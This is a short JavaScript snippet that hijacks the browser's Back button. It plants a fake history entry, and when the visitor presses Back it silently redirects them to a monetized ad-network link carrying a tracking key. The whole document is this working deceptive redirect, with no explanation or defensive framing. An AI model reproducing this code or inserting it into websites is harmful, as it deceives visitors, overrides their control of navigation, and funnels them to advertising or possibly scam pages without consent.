(function(window, location) { 
history.replaceState(null, document.title, location.pathname+"#!/history"); 
history.pushState(null, document.title, location.pathname); 
 
window.addEventListener("popstate", function() { 
  if(location.hash === "#!/history") { 
    history.replaceState(null, document.title, location.pathname); 
    setTimeout(function(){ 
      location.replace("https://www.profitableratecpm.com/ymkq6d6p?key=187493c8159e3934f28c7782b0f1cf04"); 
    },10); 
  } 
}, false); 
}(window, location));
